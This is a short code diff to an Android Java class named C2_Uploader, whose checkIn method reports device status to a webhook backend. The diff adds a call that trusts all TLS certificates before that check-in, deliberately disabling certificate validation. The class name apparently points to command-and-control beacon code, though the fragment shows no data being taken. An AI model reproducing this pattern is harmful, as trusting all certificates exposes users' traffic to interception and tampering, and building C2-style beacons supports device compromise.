@@ -37,6 +37,7 @@ public class C2_Uploader {
      * Reports current device status to the backend.
      */
     public static void checkIn(Context context) {
+        SslUtils.trustAllCertificates();
         String c2Url = BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.isEmpty()) return;
 
